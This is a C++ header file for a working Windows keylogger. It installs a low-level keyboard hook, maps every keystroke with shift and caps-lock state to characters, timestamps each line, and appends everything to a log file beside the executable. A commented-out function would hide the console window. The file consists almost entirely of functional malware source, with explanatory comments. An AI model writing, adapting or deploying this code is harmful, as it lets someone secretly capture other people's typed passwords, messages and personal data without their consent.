#pragma once
#pragma  comment(lib, "user32")
#pragma  comment(lib, "advapi32")
#include <windows.h>
#include <fstream>
#include <ctime>
#include <csignal>
#include <bitset>
#include <sstream>
#include <iostream>
#include "Encryption.h"
//
//void HideWindow() {
//	HWND hWindow = GetConsoleWindow();
//	if (hWindow != NULL) {
//		if (IsWindowVisible(hWindow) != 0) {
//			ShowWindow(hWindow, SW_HIDE);
//		}
//		CloseHandle(hWindow);
//	}
//}

std::string keylogger = "", logFile = "";
bool SetFileNames(std::string&exefile, std::string& logfile) { //create log file next to exe 
	bool success = false;
	char buffer[MAX_PATH] = "";
	//retrieves the file path of the current running executable and save into buffer
	if (GetModuleFileNameA(NULL, buffer, sizeof(buffer)) == 0) {
		printf("Cannot get the file path\n");
	}
	else {
		keylogger = logFile = buffer; // path to .exe
		std::size_t pos = logFile.rfind(".");
		if (pos == std::string::npos) { //  '.'npos means null or not found
			printf("Cannot set the log file name\n");
		}
		else {
			//delete .exe and make it .log
			logFile.erase(pos + 1);
			logFile.append("log");
			
			success = true;
		}
	}
	logfile = logFile; //return logfile
	exefile = keylogger;//return exefile
	return success;
}

void Write(std::string data) {
	//create outputfileStream object  to open logfile with append mode
	std::ofstream stream(logFile.c_str(), (std::ios::app | std::ios::binary));
	if (!stream.fail()) {
		stream.write(data.c_str(), data.length());
		stream.close();
	}
}

void LogTime() {
	time_t now = time(NULL); //current time as the number of seconds
	struct tm time = { };//local time structure, 
	char buffer[48] = "";
	//localtime_s() used to convert current time in seconds to local time
	//strftime() used to format time in hour:min:s :month:day:year
	if (now == -1 || localtime_s(&time, &now) != 0 || strftime(buffer, sizeof(buffer), "%H:%M:%S %m-%d-%Y", &time) == 0) {
		Write("<time>N/A</time>");
	}
	else {
		Write(std::string("<time>").append(buffer).append("</time>"));
	}
}

bool capital = false, numLock = false, shift = false;

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {// if it's keyboard event

		PKBDLLHOOKSTRUCT keystroke = (PKBDLLHOOKSTRUCT)lParam;//lParam contain keystroke structure which contains information about the key that was pressed or released.
		//check if shift key is pressed or released
		if (keystroke->vkCode == VK_LSHIFT || keystroke->vkCode == VK_RSHIFT) {
			shift = wParam == WM_KEYDOWN ? true : false;
		}
		//filter to listen for pressed keys only
		else if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
			switch (keystroke->vkCode) {
			case 0x41: { Write(capital ? (shift ? "a" : "A") : (shift ? "A" : "a")); break; }
			case 0x42: { Write(capital ? (shift ? "b" : "B") : (shift ? "B" : "b")); break; }
			case 0x43: { Write(capital ? (shift ? "c" : "C") : (shift ? "C" : "c")); break; }
			case 0x44: { Write(capital ? (shift ? "d" : "D") : (shift ? "D" : "d")); break; }
			case 0x45: { Write(capital ? (shift ? "e" : "E") : (shift ? "E" : "e")); break; }
			case 0x46: { Write(capital ? (shift ? "f" : "F") : (shift ? "F" : "f")); break; }
			case 0x47: { Write(capital ? (shift ? "g" : "G") : (shift ? "G" : "g")); break; }
			case 0x48: { Write(capital ? (shift ? "h" : "H") : (shift ? "H" : "h")); break; }
			case 0x49: { Write(capital ? (shift ? "i" : "I") : (shift ? "I" : "i")); break; }
			case 0x4A: { Write(capital ? (shift ? "j" : "J") : (shift ? "J" : "j")); break; }
			case 0x4B: { Write(capital ? (shift ? "k" : "K") : (shift ? "K" : "k")); break; }
			case 0x4C: { Write(capital ? (shift ? "l" : "L") : (shift ? "L" : "l")); break; }
			case 0x4D: { Write(capital ? (shift ? "m" : "M") : (shift ? "M" : "m")); break; }
			case 0x4E: { Write(capital ? (shift ? "n" : "N") : (shift ? "N" : "n")); break; }
			case 0x4F: { Write(capital ? (shift ? "o" : "O") : (shift ? "O" : "o")); break; }
			case 0x50: { Write(capital ? (shift ? "p" : "P") : (shift ? "P" : "p")); break; }
			case 0x51: { Write(capital ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break; }
			case 0x52: { Write(capital ? (shift ? "r" : "R") : (shift ? "R" : "r")); break; }
			case 0x53: { Write(capital ? (shift ? "s" : "S") : (shift ? "S" : "s")); break; }
			case 0x54: { Write(capital ? (shift ? "t" : "T") : (shift ? "T" : "t")); break; }
			case 0x55: { Write(capital ? (shift ? "u" : "U") : (shift ? "U" : "u")); break; }
			case 0x56: { Write(capital ? (shift ? "v" : "V") : (shift ? "V" : "v")); break; }
			case 0x57: { Write(capital ? (shift ? "w" : "W") : (shift ? "W" : "w")); break; }
			case 0x58: { Write(capital ? (shift ? "x" : "X") : (shift ? "X" : "x")); break; }
			case 0x59: { Write(capital ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break; }
			case 0x5A: { Write(capital ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break; }
			case 0x30: { Write(shift ? ")" : "0"); break; }
			case 0x31: { Write(shift ? "!" : "1"); break; }
			case 0x32: { Write(shift ? "@" : "2"); break; }
			case 0x33: { Write(shift ? "#" : "3"); break; }
			case 0x34: { Write(shift ? "$" : "4"); break; }
			case 0x35: { Write(shift ? "%" : "5"); break; }
			case 0x36: { Write(shift ? "^" : "6"); break; }
			case 0x37: { Write(shift ? "&" : "7"); break; }
			case 0x38: { Write(shift ? "*" : "8"); break; }
			case 0x39: { Write(shift ? "(" : "9"); break; }
			case VK_OEM_1: { Write(shift ? ":" : ";"); break; }
			case VK_OEM_2: { Write(shift ? "?" : "/"); break; }
			case VK_OEM_3: { Write(shift ? "~" : "`"); break; }
			case VK_OEM_4: { Write(shift ? "{" : "["); break; }
			case VK_OEM_5: { Write(shift ? "|" : "\\"); break; }
			case VK_OEM_6: { Write(shift ? "}" : "]"); break; }
			case VK_OEM_7: { Write(shift ? "\"" : "'"); break; }
			case VK_OEM_PLUS: { Write(shift ? "+" : "="); break; }
			case VK_OEM_COMMA: { Write(shift ? "<" : ","); break; }
			case VK_OEM_MINUS: { Write(shift ? "_" : "-"); break; }
			case VK_OEM_PERIOD: { Write(shift ? ">" : "."); break; }
			case VK_SPACE: { Write(" "); break; }
			case VK_NUMPAD0: { Write("0"); break; }
			case VK_NUMPAD1: { Write("1"); break; }
			case VK_NUMPAD2: { Write("2"); break; }
			case VK_NUMPAD3: { Write("3"); break; }
			case VK_NUMPAD4: { Write("4"); break; }
			case VK_NUMPAD5: { Write("5"); break; }
			case VK_NUMPAD6: { Write("6"); break; }
			case VK_NUMPAD7: { Write("7"); break; }
			case VK_NUMPAD8: { Write("8"); break; }
			case VK_NUMPAD9: { Write("9"); break; }
			case VK_MULTIPLY: { Write("*"); break; }
			case VK_ADD: { Write("+"); break; }
			case VK_SUBTRACT: { Write("-"); break; }
			case VK_DECIMAL: { Write(","); break; }
			case VK_DIVIDE: { Write("/"); break; }
			case VK_BACK: { Write("[del]"); break; }
			case VK_TAB: { Write("\t"); break; } 
			case VK_RETURN: {LogTime();Write("\n");  break; }
			case VK_CAPITAL: { capital = !capital;   break; }
			case VK_NUMLOCK: { numLock = !numLock;   break; }
			default: {Write(""); }


			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD tid = 0;

void HookJob() {
	// installs a low-level keyboard hook to intercept keyboard events and log the pressed keys.

	// param1 => hooktype,
	// param2 => function that will be called when the hook triggers,
	// param3 =>  A handle to the module containing the hook procedure,Null because it's local function
	// param4 => The ID of the thread with which the hook procedure is to be associated
	HHOOK hHook = SetWindowsHookExA(WH_KEYBOARD_LL, HookProc, NULL, 0);
	if (hHook == NULL) {
		printf("Cannot install the hook procedure\n");
	}
	else {
		printf("Hook procedure has been installed successfully\n");
		printf("\nKeylogger is up and running...\n");
		capital = GetKeyState(VK_CAPITAL);//if capslock is on or off
		numLock = GetKeyState(VK_NUMLOCK);//if numlock is on or off
		MSG msg = { };
		//get user input events from message queue
		while (GetMessageA(&msg, NULL, 0, 0) > 0) { // get keystrokes from queue
			TranslateMessage(&msg);//translate keyboard messages into character messages
			DispatchMessageA(&msg);//used to send the messages to the appropriate window procedure
		}
		if (UnhookWindowsHookEx(hHook) == 0) {
			printf("\nCannot uninstall the hook procedure\n");
		}
		else {
			printf("\nHook procedure has been uninstalled successfully\n");
		}
		CloseHandle(hHook);
	}
}

void RemoveHookThread(int code) {
	// used to request  the thread terminate cleanly , return 0 if failed
	if (PostThreadMessageA(tid, WM_QUIT, NULL, NULL) == 0) {
		printf("\nCannot send the WM_QUIT message to the hook thread\n");
		exit(EXIT_FAILURE);
	}
}

void CreateHookThread() {
	//logtime
	LogTime();
	//create new thread 
	// param1 => security attributes structure, default is null,
	// param2 => initial stack size for new thread,default is 0
	// param3 => A pointer to the thread function 
	// param4 => paramter for the threadfunction , default is null,
	// param5 => flags to control thread creation , default is 0,
	// param6 => pointer to a variable that receives the thread identifier.

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HookJob, NULL, 0, &tid);
	if (hThread == NULL) {
		printf("Cannot create a new hook thread\n");
	}
	else {
		//the signal() function is used to register a signal handler for the SIGINT signal, which is the interrupt signal.
		//RemoveHookThread() is used as signal handler , which removes the hook thread and exits the program.
		signal(SIGINT, RemoveHookThread);
		WaitForSingleObject(hThread, INFINITE);
		signal(SIGINT, SIG_DFL);
		CloseHandle(hThread);
	}
}

